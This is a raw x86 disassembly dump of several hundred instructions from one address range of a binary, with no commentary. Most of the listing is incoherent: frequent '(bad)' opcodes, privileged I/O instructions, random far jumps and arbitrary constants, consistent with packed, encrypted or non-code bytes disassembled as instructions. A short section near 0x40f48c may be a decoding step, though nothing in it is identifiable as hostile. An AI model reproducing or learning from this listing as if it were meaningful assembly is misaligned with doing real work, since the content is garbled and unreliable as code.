  40f209:	lods   al,BYTE PTR ds:[esi]
  40f20a:	xchg   BYTE PTR [ebp+0x34],bl
  40f20d:	push   ebp
  40f20e:	pop    eax
  40f20f:	icebp  
  40f210:	mov    ecx,0xe78b2e75
  40f215:	xlat   BYTE PTR ds:[ebx]
  40f216:	mov    bl,0x19
  40f218:	push   edx
  40f219:	xchg   bh,cl
  40f21b:	mov    bh,0x88
  40f21d:	icebp  
  40f21e:	add    eax,0x6c81308f
  40f223:	sti    
  40f224:	int3   
  40f225:	push   edx
  40f226:	aad    0xcc
  40f228:	cdq    
  40f229:	pop    eax
  40f22a:	sbb    eax,0xab2571eb
  40f22f:	stos   DWORD PTR es:[edi],eax
  40f230:	(bad)  
  40f231:	push   0xc8cb970d
  40f236:	jmp    0x40f29d
  40f238:	iret   
  40f239:	mov    al,fs:0x95c78bc6
  40f23f:	test   BYTE PTR [edx-0x6bf0e0a3],bl
  40f245:	out    0xbe,eax
  40f247:	pop    ebx
  40f248:	xchg   BYTE PTR [edi-0x14],dl
  40f24b:	lahf   
  40f24c:	and    edx,DWORD PTR [eax+0x10]
  40f24f:	(bad)  
  40f251:	xchg   edi,eax
  40f252:	and    al,0x8f
  40f254:	and    DWORD PTR [edx],edx
  40f256:	(bad)  
  40f257:	fstp   QWORD PTR ds:0x85659e9
  40f25d:	scas   al,BYTE PTR es:[edi]
  40f25e:	inc    edx
  40f25f:	push   ds
  40f260:	mov    al,ds:0xde0a430
  40f265:	xchg   ebx,eax
  40f266:	and    DWORD PTR [edi+0x57],edi
  40f269:	out    0xfc,al
  40f26b:	cmp    al,BYTE PTR [esi+0x1c]
  40f26e:	push   esi
  40f26f:	fidiv  WORD PTR [edx]
  40f271:	in     al,0x61
  40f273:	sbb    ch,bl
  40f275:	and    DWORD PTR [eax],ebx
  40f277:	xor    DWORD PTR [esi-0x54],0xde380733
  40f27e:	add    BYTE PTR [eax-0x74],bh
  40f281:	out    dx,al
  40f282:	mov    es,ebp
  40f284:	dec    ebx
  40f285:	add    BYTE PTR [edi-0x197fb7f8],dl
  40f28b:	ja     0x40f2df
  40f28d:	shl    BYTE PTR [edi+0x14],cl
  40f290:	add    ebp,DWORD PTR [ebx]
  40f292:	clc    
  40f293:	pop    ss
  40f294:	scas   al,BYTE PTR es:[edi]
  40f295:	fldenv [eax+ecx*4]
  40f298:	leave  
  40f299:	dec    eax
  40f29a:	rcr    BYTE PTR [ebp-0x1f],0x7a
  40f29e:	pop    ss
  40f29f:	gs sub eax,0x58d8036d
  40f2a5:	mov    bh,0x76
  40f2a7:	pop    eax
  40f2a8:	fmul   QWORD PTR [ecx]
  40f2aa:	pop    ecx
  40f2ab:	mov    bl,0x81
  40f2ad:	xchg   BYTE PTR [ebp-0x56],dh
  40f2b0:	sbb    edx,ecx
  40f2b2:	cld    
  40f2b3:	add    DWORD PTR [edx+0x6e0f4f19],ebp
  40f2b9:	rol    DWORD PTR [esi+0x1b77714d],0x1e
  40f2c0:	frstpm(287 only) 
  40f2c2:	and    dh,BYTE PTR [ecx-0xe171533]
  40f2c8:	jne    0x40f28d
  40f2ca:	test   ah,bh
  40f2cc:	adc    eax,DWORD PTR [esi*1-0x637f9f00]
  40f2d3:	mov    ebp,0xea64802d
  40f2d8:	jl     0x40f2cd
  40f2da:	(bad)  
  40f2db:	bound  ebp,QWORD PTR [edx-0x2]
  40f2de:	sti    
  40f2df:	xchg   edi,eax
  40f2e0:	jp     0x40f352
  40f2e2:	push   ebp
  40f2e3:	mov    dh,0x8e
  40f2e5:	bound  eax,QWORD PTR [ebx+ebp*2+0x60]
  40f2e9:	fstp   DWORD PTR [edi-0x71]
  40f2ec:	jmp    0x977f:0x7855e293
  40f2f3:	pop    ebp
  40f2f4:	add    edi,DWORD PTR [ecx]
  40f2f6:	in     al,0x4e
  40f2f8:	xor    BYTE PTR [ecx+0x48533c7c],dh
  40f2fe:	add    eax,0x7c9910b0
  40f303:	out    0x1f,al
  40f305:	comiss xmm2,DWORD PTR [esi+0x43]
  40f309:	cmp    DWORD PTR [ebp-0x31660eeb],edi
  40f30f:	mov    DWORD PTR [eax],esp
  40f311:	jno    0x40f2f1
  40f313:	repz leave 
  40f315:	test   al,0xe2
  40f317:	xchg   edi,eax
  40f318:	adc    esp,DWORD PTR [ebp-0x11]
  40f31b:	ds retf 0x113f
  40f31f:	sbb    DWORD PTR [ebp+0x1360101f],esp
  40f325:	sti    
  40f326:	cmp    BYTE PTR fs:[eax-0x17108ed3],ch
  40f32d:	popa   
  40f32e:	cmp    ah,dh
  40f330:	sbb    ch,BYTE PTR [ebp+0x62]
  40f333:	cmp    DWORD PTR [edi],edi
  40f335:	shl    dh,0x73
  40f338:	mov    edi,DWORD PTR [ecx]
  40f33a:	sub    dl,al
  40f33c:	or     edx,eax
  40f33e:	xchg   ebp,eax
  40f33f:	push   es
  40f340:	add    DWORD PTR [ebx-0x2bb932e],ebp
  40f346:	mov    al,ds:0xdc4a6406
  40f34b:	outs   dx,BYTE PTR ds:[esi]
  40f34c:	or     DWORD PTR [eax+0x6bc36890],edi
  40f352:	lahf   
  40f353:	aad    0xc2
  40f355:	retf   
  40f356:	mov    BYTE PTR [edi],ch
  40f358:	rcr    eax,1
  40f35a:	ror    DWORD PTR [bx+si],1
  40f35d:	mov    ebp,0x1b57f43c
  40f362:	fist   WORD PTR [edx-0x3c]
  40f365:	stc    
  40f366:	and    eax,0xc0045843
  40f36b:	xor    eax,0x2568d9a2
  40f370:	xor    dl,ch
  40f372:	in     al,dx
  40f373:	retf   0x7ade
  40f376:	sbb    al,0x68
  40f378:	rol    BYTE PTR [ebx+0x4994ede6],1
  40f37e:	jo     0x40f3ae
  40f380:	push   edx
  40f381:	inc    ebx
  40f382:	pop    ss
  40f383:	sbb    ebx,DWORD PTR [ebx-0x15ca8896]
  40f389:	xchg   ebp,eax
  40f38a:	xchg   esi,eax
  40f38b:	jno    0x40f405
  40f38d:	jp     0x40f3be
  40f38f:	mov    ecx,0xd0c4ead
  40f394:	sar    BYTE PTR [esi+0x5b9c673],0xcd
  40f39b:	lea    ecx,[esp+ecx*1-0xd]
  40f39f:	or     bh,ch
  40f3a1:	in     eax,0x4b
  40f3a3:	fcomp  QWORD PTR [edi-0x12]
  40f3a6:	cld    
  40f3a7:	shr    DWORD PTR [esi],1
  40f3a9:	leave  
  40f3aa:	fprem1 
  40f3ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f3ad:	adc    DWORD PTR [esi-0x21],ebp
  40f3b0:	xor    DWORD PTR [ebp+ebp*8+0xa1bceec],ebx
  40f3b7:	jnp    0x40f3fb
  40f3b9:	pop    ds
  40f3ba:	mov    ah,0x4b
  40f3bc:	jbe    0x40f3df
  40f3be:	adc    DWORD PTR [edi],ebx
  40f3c0:	mov    ds:0x3e584d3d,eax
  40f3c5:	push   cs
  40f3c6:	jno    0x40f3ce
  40f3c8:	cld    
  40f3c9:	clc    
  40f3ca:	retf   
  40f3cb:	xchg   edx,eax
  40f3cc:	mov    dh,0xf5
  40f3ce:	jnp    0x40f3e7
  40f3d0:	add    DWORD PTR [esi-0x7c6e7779],edx
  40f3d6:	cs mov bh,0xbf
  40f3d9:	lds    eax,FWORD PTR [edi-0x5e]
  40f3dc:	loop   0x40f41f
  40f3de:	mov    DWORD PTR [edi+0x24060b58],0x25c251ff
  40f3e8:	and    DWORD PTR [edi],edx
  40f3ea:	inc    esi
  40f3eb:	rol    bh,1
  40f3ed:	sbb    eax,0x3d10a500
  40f3f2:	lds    edi,FWORD PTR [edi]
  40f3f4:	mov    ch,cl
  40f3f6:	push   cs
  40f3f7:	xor    eax,0x72dffee8
  40f3fc:	mov    cs,WORD PTR [ebx+ebp*2-0x10]
  40f400:	sub    al,0x6
  40f402:	addr16 and al,0xbd
  40f405:	mov    ebp,0xb3251739
  40f40a:	lods   al,BYTE PTR ds:[esi]
  40f40b:	sar    BYTE PTR [ebp+0x57b0bce8],1
  40f411:	ret    
  40f412:	adc    ebp,esp
  40f414:	dec    esp
  40f415:	rol    edi,cl
  40f417:	and    eax,DWORD PTR [eax+eax*1]
  40f41a:	enter  0x2145,0x6f
  40f41e:	xchg   edx,eax
  40f41f:	aam    0x7e
  40f421:	les    ebx,FWORD PTR [eax]
  40f423:	inc    ecx
  40f424:	ficomp WORD PTR [ebp-0x25]
  40f427:	loop   0x40f48f
  40f429:	loop   0x40f3f2
  40f42b:	lods   al,BYTE PTR ds:[esi]
  40f42c:	adc    edi,DWORD PTR [ebx-0x11]
  40f42f:	sub    eax,0x510e12
  40f434:	cld    
  40f435:	sbb    al,0x92
  40f437:	nop
  40f438:	or     BYTE PTR [ebp*1+0x27a51b7b],ah
  40f43f:	fsub   QWORD PTR [ecx-0x4bc752fa]
  40f445:	mov    edi,0xae56c9ea
  40f44a:	sub    BYTE PTR [esi+0x780cce48],cl
  40f450:	mov    WORD PTR [edi],fs
  40f452:	(bad)  
  40f453:	das    
  40f454:	scas   al,BYTE PTR es:[edi]
  40f455:	fcomp  st(2)
  40f457:	push   cs
  40f458:	aaa    
  40f459:	aaa    
  40f45a:	xchg   edi,eax
  40f45b:	mov    dl,0x9d
  40f45d:	ja     0x40f42a
  40f45f:	cmp    cl,BYTE PTR [edx]
  40f461:	js     0x166461e9
  40f467:	cmp    al,0x46
  40f469:	mov    ecx,0x44a78e19
  40f46e:	mov    WORD PTR [ecx],?
  40f470:	cs adc al,0x8b
  40f473:	cli    
  40f474:	cmp    al,0x3a
  40f476:	cmp    eax,0xc666d4cd
  40f47b:	xor    eax,0x7af25258
  40f480:	sar    ebp,0x7
  40f483:	adc    al,0x5c
  40f485:	and    eax,eax
  40f487:	adc    eax,0x8d24c846
  40f48c:	adc    edx,DWORD PTR [ecx+0x39aea03a]
  40f492:	sub    DWORD PTR [esi],esp
  40f494:	mov    edx,DWORD PTR [edx]
  40f496:	mov    esi,DWORD PTR ds:0x421cb2
  40f49c:	add    DWORD PTR [edx],esi
  40f49e:	mov    esi,DWORD PTR [ebp+0x8]
  40f4a1:	mov    edx,DWORD PTR ds:0x421cb2
  40f4a7:	xor    esi,0x7510893
  40f4ad:	add    esi,0x3272db
  40f4b3:	jmp    0x411847
  40f4b8:	jae    0x40f43a
  40f4ba:	mov    ah,0xa9
  40f4bc:	xchg   ebx,eax
  40f4bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f4be:	jecxz  0x40f52c
  40f4c0:	pop    esi
  40f4c1:	sbb    ch,BYTE PTR [ebp-0x65]
  40f4c4:	daa    
  40f4c5:	fdivr  DWORD PTR [esi-0x80]
  40f4c8:	dec    ebx
  40f4c9:	lea    esp,[edx+0x62]
  40f4cc:	jmp    0x40f52d
  40f4ce:	bound  esp,QWORD PTR [edx+0x76]
  40f4d1:	fsub   st,st(2)
  40f4d3:	fist   WORD PTR [esi]
  40f4d5:	inc    ebx
  40f4d6:	mov    eax,0xdbd9d783
  40f4db:	aam    0x1f
  40f4dd:	sub    ah,BYTE PTR [eax+0x34114245]
  40f4e3:	je     0x40f564
  40f4e5:	out    dx,eax
  40f4e6:	shl    ebp,cl
  40f4e8:	push   cs
  40f4e9:	ins    DWORD PTR es:[edi],dx
  40f4ea:	push   0xcd28c501
  40f4ef:	push   esi
  40f4f0:	out    0xcf,al
  40f4f2:	pop    ebx
  40f4f3:	into   
  40f4f4:	push   ebx
  40f4f5:	fmul   QWORD PTR [ebp-0x3e]
  40f4f8:	jge    0x40f577
  40f4fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f4fb:	scas   al,BYTE PTR es:[edi]
  40f4fc:	push   ebx
  40f4fd:	mov    esi,eax
  40f4ff:	jne    0x40f4af
  40f501:	aam    0xc
  40f503:	(bad)  
  40f504:	and    DWORD PTR [edi+0x52],ebx
  40f507:	pop    edx
  40f508:	adc    DWORD PTR [ebx+0x159d222f],edi
  40f50e:	fstp   QWORD PTR [ebx-0x32]
  40f511:	lock push 0xdd182822
  40f517:	pusha  
  40f518:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  40f51a:	push   edi
  40f51b:	(bad)  
  40f51c:	fist   WORD PTR [ebp+0xd]
  40f51f:	dec    edi
  40f520:	sahf   
  40f521:	xchg   edi,eax
  40f522:	lods   eax,DWORD PTR ds:[esi]
  40f523:	sub    BYTE PTR [esi],cl
  40f525:	(bad)  
  40f526:	mov    ch,0x8c
  40f528:	dec    esi
  40f529:	fsubr  DWORD PTR [esi+0x6d397573]
  40f52f:	int    0x2a
  40f531:	cld    
  40f532:	clc    
  40f533:	loope  0x40f4ce
  40f535:	adc    al,0x6a
  40f537:	inc    ecx
  40f538:	pop    esi
  40f539:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f53a:	cmp    bh,cl
  40f53c:	dec    edi
  40f53d:	in     eax,0x69
  40f53f:	int    0x2b
  40f541:	mov    ebp,DWORD PTR [eax+eiz*4]
  40f544:	jb     0x40f587
  40f546:	dec    eax
  40f547:	pop    ds
  40f548:	mov    eax,0x4b190c7e
  40f54d:	mov    DWORD PTR [ebx+0x4c6003ed],edi
  40f553:	xor    ah,BYTE PTR [esi]
  40f555:	jae    0x40f590
  40f557:	les    esp,FWORD PTR [edx+0x647a8ec5]
  40f55d:	icebp  
  40f55e:	pop    esp
  40f55f:	loop   0x40f5a4
  40f561:	sbb    al,0x71
  40f563:	retf   0xf848
  40f566:	pop    ebp
  40f567:	jle    0x40f4ef
  40f569:	push   edi
  40f56a:	pop    ecx
  40f56b:	ficomp DWORD PTR [edx-0x59]
  40f56e:	repz adc eax,0xb1999669
  40f574:	shr    DWORD PTR [ecx-0x238877ab],cl
  40f57a:	fisttp QWORD PTR [esi-0x29]
  40f57d:	test   DWORD PTR [di-0x3b],ecx
  40f581:	or     eax,0xe5b5bc05
  40f586:	sar    DWORD PTR [ecx],1
  40f588:	stos   DWORD PTR es:[edi],eax
  40f589:	aaa    
  40f58a:	mov    ch,0x68
  40f58c:	dec    esi
  40f58d:	in     eax,0x90
  40f58f:	retf   0xb008
  40f592:	push   ds
  40f593:	ins    DWORD PTR es:[edi],dx
  40f594:	ds push ecx
  40f596:	inc    edx
  40f597:	fs mov esp,0x38e51863
  40f59d:	pop    ds
  40f59e:	pop    edi
  40f59f:	xchg   edx,eax
  40f5a0:	jmp    0xf53c:0x61782d84
  40f5a7:	dec    ecx
  40f5a8:	jne    0x40f582
  40f5aa:	sub    BYTE PTR [ebx],bh
  40f5ac:	(bad)  
  40f5ad:	div    BYTE PTR [eax-0x7c]
  40f5b0:	ss ret 
  40f5b2:	outs   dx,DWORD PTR ds:[esi]
  40f5b3:	retf   
  40f5b4:	pushf  
  40f5b5:	or     bh,BYTE PTR [eax]
  40f5b7:	pop    esi
  40f5b8:	dec    edi
  40f5b9:	(bad)  
  40f5ba:	fisub  DWORD PTR [ebp-0x342036ae]
  40f5c0:	xor    ch,dl
  40f5c2:	mov    bh,0xf5
  40f5c4:	stc    
  40f5c5:	adc    edi,DWORD PTR [edi]
  40f5c7:	xchg   edi,eax
  40f5c8:	mov    al,ds:0xd418a826
  40f5cd:	ja     0x40f5f3
  40f5cf:	xchg   esp,eax
  40f5d0:	jne    0x40f5b7
  40f5d2:	mov    esp,eax
  40f5d4:	shr    BYTE PTR [edx+0x3c],1
  40f5d7:	call   0x5381:0x7bbebd65
  40f5de:	loop   0x40f584
  40f5e0:	fbld   TBYTE PTR [ebx+0x6d09f84c]
  40f5e6:	mov    WORD PTR [eax],ss
  40f5e8:	xchg   ebx,eax
  40f5e9:	mov    ds:0x25e0f76d,eax
  40f5ee:	cld    
  40f5ef:	(bad)  
  40f5f0:	jnp    0x40f654
  40f5f2:	fisubr DWORD PTR [eax]
  40f5f4:	test   al,0xdb
  40f5f6:	nop
  40f5f7:	idiv   edi
  40f5f9:	dec    eax
  40f5fa:	xchg   esp,eax
  40f5fb:	jae    0x40f654
  40f5fd:	leave  
  40f5fe:	lods   al,BYTE PTR ds:[esi]
  40f5ff:	data16 mov ch,0xe6
  40f602:	xor    ah,BYTE PTR [ecx]
  40f604:	int    0x3c
  40f606:	out    dx,al
  40f607:	add    esi,edi
  40f609:	pop    ss
  40f60a:	fadd   QWORD PTR [ecx+0x57]
  40f60d:	cmc    
  40f60e:	inc    eax
  40f60f:	pop    ebx
  40f610:	sbb    DWORD PTR [ebx+ecx*8+0x59],0x376180b1
  40f618:	push   ds
  40f619:	xchg   edx,eax
  40f61a:	mov    al,0xee
  40f61c:	bound  edi,QWORD PTR [edx-0x757a2831]
  40f622:	lods   al,BYTE PTR ds:[esi]
  40f623:	cmc    
  40f624:	nop
  40f625:	pusha  
  40f626:	mov    DWORD PTR [ecx],ecx
  40f628:	push   edi
  40f629:	xor    edx,DWORD PTR [eax]
  40f62b:	jb     0x40f5de
  40f62d:	dec    esi
  40f62e:	push   esi
  40f62f:	stc    
  40f630:	fwait
  40f631:	or     bh,0x9e
  40f634:	inc    ebx
  40f635:	sub    DWORD PTR [ecx],edi
  40f637:	xor    eax,0x7b4b12f1
  40f63c:	pop    eax
  40f63d:	inc    edi
  40f63e:	xchg   edi,eax
  40f63f:	jle    0x40f6ad
  40f641:	add    eax,0x99b81102
  40f646:	cmp    sp,WORD PTR [edx]
  40f649:	xchg   BYTE PTR [esp+edx*4+0x9],ch
  40f64d:	jbe    0x40f66d
  40f64f:	cld    
  40f650:	sub    DWORD PTR [edi],ecx
  40f652:	mov    dh,BYTE PTR ds:0xe189aca9
  40f658:	mov    ds,WORD PTR [esi+0x2b]
  40f65b:	fwait
  40f65c:	xchg   ebx,eax
  40f65d:	adc    eax,0xdde807e0
  40f662:	fst    DWORD PTR [edi]
  40f664:	es repnz aaa 
  40f667:	fiadd  DWORD PTR [ebx+0x66]
  40f66a:	sti    
  40f66b:	inc    edi
  40f66c:	pusha  
  40f66d:	inc    esp
  40f66e:	aam    0x47
  40f670:	mov    ah,BYTE PTR [edx+0xcecd92d]
  40f676:	aad    0xbc
  40f678:	fidiv  WORD PTR [ecx+edx*8+0x6fa78902]
  40f67f:	sbb    ch,BYTE PTR [ebx-0x121823b7]
  40f685:	test   DWORD PTR [esi],esp
  40f687:	xchg   ebx,eax
  40f688:	mov    edx,0x2858413a
  40f68d:	dec    esi
  40f68e:	fsin   
  40f690:	mov    ebx,0x77498403
  40f695:	push   ecx
  40f696:	and    eax,0x8387f60c
  40f69b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f69c:	test   eax,0x87711bd3
  40f6a1:	cmp    edi,0xc3c86f1b
  40f6a7:	mov    dl,0x20
  40f6a9:	test   al,0x8c
  40f6ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f6ac:	test   al,0x6a
  40f6ae:	jg     0x40f68e
  40f6b0:	test   DWORD PTR [ecx+0x5d],edx
  40f6b3:	pop    ebx
  40f6b4:	lods   al,BYTE PTR ds:[esi]
  40f6b5:	cmp    eax,DWORD PTR [esi+0x1ca5a925]
  40f6bb:	inc    edx
  40f6bc:	push   ecx
  40f6bd:	into   
  40f6be:	jmp    0xac87:0xacc6b226
  40f6c5:	inc    ebx
  40f6c6:	cmc    
  40f6c7:	inc    eax
  40f6c8:	adc    BYTE PTR [edx+0x1d450840],dh
  40f6ce:	vunpckhps xmm6,xmm1,XMMWORD PTR [eax-0x6c]
  40f6d3:	inc    ebx
  40f6d4:	cld    
  40f6d5:	lock pop ebx
  40f6d7:	jne    0x40f685
  40f6d9:	pop    edi
  40f6da:	shl    ch,cl
  40f6dc:	push   edi
  40f6dd:	mov    dl,0xcf
  40f6df:	mov    edx,0xcdbb7f12
  40f6e4:	add    eax,DWORD PTR [esi-0x12a5fd69]
  40f6ea:	mov    bl,BYTE PTR [edx+0x7f]
  40f6ed:	mov    cl,0x5
  40f6ef:	scas   eax,DWORD PTR es:[edi]
  40f6f0:	and    al,0x7d
  40f6f2:	push   ebp
  40f6f3:	leave  
  40f6f4:	imul   ecx,DWORD PTR [edx-0x3fa6805e],0xffffffcd
  40f6fb:	push   0x3095820e
  40f700:	call   0x52a995cf
  40f705:	ins    BYTE PTR es:[edi],dx
  40f706:	mov    ecx,0x15a3ed4d
  40f70b:	jp     0x40f750
  40f70d:	pop    ss
  40f70e:	cmc    
  40f70f:	lea    dx,[edi+ebx*4]
  40f713:	aam    0x16
  40f715:	aaa    
  40f716:	mov    bl,0xdb
  40f718:	and    bl,ch
  40f71a:	xor    esp,DWORD PTR [edi+0x5c976f4c]
  40f720:	inc    esp
  40f721:	test   al,0xdf
  40f723:	(bad)  
  40f724:	(bad)  
  40f726:	jno    0x40f781
  40f728:	mul    edi
  40f72a:	inc    ebp
  40f72b:	inc    eax
  40f72c:	sub    al,0xb4
  40f72e:	adc    eax,0xe1cff5e3
  40f733:	scas   eax,DWORD PTR es:[edi]
  40f734:	mov    ebx,0x29218963
  40f739:	jle    0x40f71d
  40f73b:	lods   eax,DWORD PTR ds:[esi]
  40f73c:	aad    0x54
  40f73e:	cmc    
  40f73f:	out    dx,al
  40f740:	dec    esp
  40f741:	cdq    
  40f742:	cmp    al,0x6b
  40f744:	dec    esi
  40f745:	(bad)  
  40f746:	inc    DWORD PTR [edx]
  40f748:	sbb    eax,0x969162dc
  40f74d:	adc    eax,0xe1085213
  40f752:	clc    
  40f753:	retf   0x387c
  40f756:	xchg   edx,eax
  40f757:	pop    ss
  40f758:	adc    DWORD PTR [ecx+0x63],ebx
  40f75b:	jo     0x40f74b
  40f75d:	pop    eax
  40f75e:	rol    al,1
  40f760:	adc    edx,DWORD PTR ds:0x12e80db0
  40f766:	shl    BYTE PTR [esi],0xa0
  40f769:	sar    DWORD PTR [eax+esi*8+0x42],1
  40f76d:	xchg   edi,eax
  40f76e:	jnp    0x40f7a1
  40f770:	lods   eax,DWORD PTR ds:[esi]
  40f771:	js     0x40f795
  40f773:	pop    es
  40f774:	enter  0xee45,0xa0
  40f778:	rcr    cl,1
  40f77a:	xor    DWORD PTR [edx+0x27cd0e08],edi
  40f780:	and    al,0x9e
  40f782:	mov    bh,0xb1
  40f784:	add    DWORD PTR [edx+esi*8-0x351e7730],ecx
  40f78b:	adc    eax,0x22408a1a
  40f790:	pusha  
  40f791:	out    0x4,al
  40f793:	cmp    BYTE PTR [esi-0x4d],dh
  40f796:	sbb    BYTE PTR [ebx+0xe],bl
  40f799:	xor    DWORD PTR [edi+0x50],ebx
  40f79c:	iret   
  40f79d:	dec    ebx
  40f79e:	shl    DWORD PTR [ebx-0x50],cl
  40f7a1:	mov    bl,0xb3
  40f7a3:	paddq  mm6,QWORD PTR [edx-0x59bebba5]
  40f7aa:	mov    BYTE PTR [esi+0x57134140],0x79
  40f7b1:	mov    BYTE PTR [ecx+edx*8-0x4c3fc6b1],ch
  40f7b8:	lock sub eax,0x7ff7a23b
  40f7be:	pop    ecx
  40f7bf:	icebp  
  40f7c0:	mov    edx,0x8fc75b07
  40f7c5:	xchg   edx,eax
  40f7c6:	mov    edx,0x6a204c2a
  40f7cb:	(bad)  
  40f7cc:	jp     0x40f758
  40f7ce:	sub    al,0x9d
  40f7d0:	adc    eax,eax
  40f7d2:	enter  0x1d77,0x5
  40f7d6:	ret    
  40f7d7:	mov    eax,ds:0x9eb049ae
  40f7dc:	jnp    0x40f7b8
  40f7de:	adc    DWORD PTR [esi-0x1e],ebx
  40f7e1:	das    
  40f7e2:	test   eax,0x7e7a1fa
  40f7e7:	and    al,bl
  40f7e9:	jmp    0xd9a4:0x96303e31
  40f7f0:	adc    eax,0xe97e0015
  40f7f5:	cmp    edx,ecx
  40f7f7:	ins    DWORD PTR es:[edi],dx
  40f7f8:	call   0x6284:0xa01952ec
  40f7ff:	fidivr DWORD PTR [eax+edx*2-0x4b]
  40f803:	dec    esi
  40f804:	sbb    dl,BYTE PTR ds:[ebp-0x596e73a9]
  40f80b:	call   0xe8c7:0xb7a91976
  40f812:	pushf  
  40f813:	loop   0x40f890
  40f815:	(bad)  
  40f816:	jmp    0x40f86d
  40f818:	pop    eax
  40f819:	repz call DWORD PTR [eax]
  40f81c:	mov    esp,esi
  40f81e:	push   ebp
  40f81f:	mov    BYTE PTR [edx+ebp*4],ch
  40f822:	mov    ah,0xf5
  40f824:	das    
  40f825:	pop    es
  40f826:	mov    ebp,DWORD PTR ds:0x2c094807
  40f82c:	repz shl DWORD PTR [esi],cl
  40f82f:	ret    0xa4c7
  40f832:	and    DWORD PTR [ecx],edx
  40f834:	loop   0x40f899
  40f836:	lahf   
  40f837:	sub    al,0xc6
  40f839:	push   ebp
  40f83a:	jp     0x40f7df
  40f83c:	cmp    bl,BYTE PTR [esi]
  40f83e:	into   
  40f83f:	jb     0x40f8b6
  40f841:	popa   
  40f842:	adc    bl,dh
  40f844:	int3   
  40f845:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f846:	into   
  40f847:	repnz div DWORD PTR [eax-0x6a]
  40f84b:	adc    cl,BYTE PTR [edx+0x1e269f75]
  40f851:	retw   
  40f853:	in     al,dx
  40f854:	pushf  
  40f855:	retf   
  40f856:	or     ebp,DWORD PTR [edi+0x14bd8f08]
  40f85c:	pop    ebx
  40f85d:	dec    eax
  40f85e:	add    BYTE PTR [esi-0x6d2a66f6],0x34
  40f865:	pop    ebp
  40f866:	out    0x3b,eax
  40f868:	xchg   ebp,eax
  40f869:	xchg   ecx,eax
  40f86a:	in     eax,0xf2
  40f86c:	pop    edx
  40f86d:	lea    ebp,[eax-0x1e]
  40f870:	stc    
  40f871:	and    al,0xc9
  40f873:	jmp    0x40f893
  40f875:	test   BYTE PTR [ebp+0x31],0x2a
  40f879:	(bad)  
  40f87b:	add    al,0x9c
  40f87d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f87e:	xor    cl,BYTE PTR [edx-0x1d56c0ff]
  40f884:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f885:	adc    ebp,DWORD PTR [eax-0x22]
  40f888:	jo     0x40f8a8
  40f88a:	xchg   edi,eax
  40f88b:	sar    DWORD PTR [ecx-0x53a06df9],1
  40f891:	(bad)
  40f895:	mov    dh,0xe8
  40f897:	xor    DWORD PTR [eax],ebp
  40f899:	inc    edi
  40f89a:	pusha  
  40f89b:	ins    BYTE PTR es:[edi],dx
  40f89c:	arpl   WORD PTR [edx-0x58],bp
  40f89f:	mov    edi,0x3f6a9b40
  40f8a4:	mov    eax,0xc30a08a8
  40f8a9:	sub    al,0xed
  40f8ab:	inc    ebx
  40f8ac:	xor    eax,DWORD PTR [eax-0x49]
  40f8af:	in     eax,0x91
  40f8b1:	inc    ebp
  40f8b2:	and    DWORD PTR [ebx+0x3129b3fa],edi
  40f8b8:	inc    eax
  40f8b9:	pop    ebp
  40f8ba:	inc    edi
  40f8bb:	es cli 
  40f8bd:	ss inc ebp
  40f8bf:	loope  0x40f899
  40f8c1:	pop    es
  40f8c2:	xchg   ebp,eax
  40f8c3:	cmp    esp,edi
  40f8c5:	shl    BYTE PTR [ebx],cl
  40f8c7:	lds    edi,FWORD PTR [ebx]
  40f8c9:	ins    BYTE PTR es:[edi],dx
  40f8ca:	adc    BYTE PTR [esi-0x273aecdc],bh
  40f8d0:	(bad)  
  40f8d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f8d2:	mov    ch,0xe5
  40f8d4:	test   DWORD PTR [esi+0x479520be],ecx
  40f8da:	pushf  
  40f8db:	cmp    al,0xcf
  40f8dd:	sar    BYTE PTR [edx],1
  40f8df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f8e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f8e1:	outs   dx,BYTE PTR ds:[esi]
  40f8e2:	in     eax,dx
  40f8e3:	or     esi,DWORD PTR [ebx-0x7060b1c2]
  40f8e9:	inc    ecx
  40f8ea:	mov    esp,0xd2b14352
  40f8ef:	js     0x40f87f
  40f8f1:	jp     0x40f8de
  40f8f3:	stc    
  40f8f4:	lods   eax,DWORD PTR ds:[esi]
  40f8f5:	xchg   BYTE PTR ds:0x1418d01,dl
  40f8fb:	jbe    0x40f95e
  40f8fd:	call   0x1ade790e
  40f902:	or     eax,DWORD PTR [ebp+0x5b]
  40f905:	xlat   BYTE PTR ds:[ebx]
  40f906:	jmp    0xb742:0x14712751
  40f90d:	stos   WORD PTR es:[edi],ax
  40f90f:	dec    eax
  40f910:	sbb    DWORD PTR [esi],0xffffffd1
  40f913:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f914:	push   ecx
  40f915:	fst    DWORD PTR [eax-0x6b]
  40f918:	mov    ebx,0x6676324a
  40f91d:	pop    ss
  40f91e:	test   al,0xa4
  40f920:	neg    BYTE PTR [edx]
  40f922:	and    al,BYTE PTR [edi]
  40f924:	mov    BYTE PTR [esi],bh
  40f926:	jmp    0x40f945
  40f928:	popf   
  40f929:	aad    0xb0
  40f92b:	icebp  
  40f92c:	out    0xc9,al
  40f92e:	mov    ds:0xd970573d,al
  40f933:	fs popa 
  40f935:	sub    DWORD PTR ss:[ebp-0x1c],eax
  40f939:	jo     0x40f90c
  40f93b:	out    dx,eax
  40f93c:	dec    edx
  40f93d:	cmp    bl,cl
  40f93f:	(bad)  
  40f941:	ss je  0x40f941
  40f944:	ss data16 std 
  40f947:	sub    BYTE PTR [esi+eiz*2+0x1218bd2f],bh
  40f94e:	xorps  xmm3,XMMWORD PTR [edx+0x5f354cec]
  40f955:	test   BYTE PTR [edx-0xa030e1d],0xab
  40f95c:	fcmovne st,st(3)
  40f95e:	clc    
  40f95f:	test   BYTE PTR [edx+0xe3de25],dh
  40f965:	cs push edx
  40f967:	xor    BYTE PTR [edi-0x7],ch
  40f96a:	inc    ebx
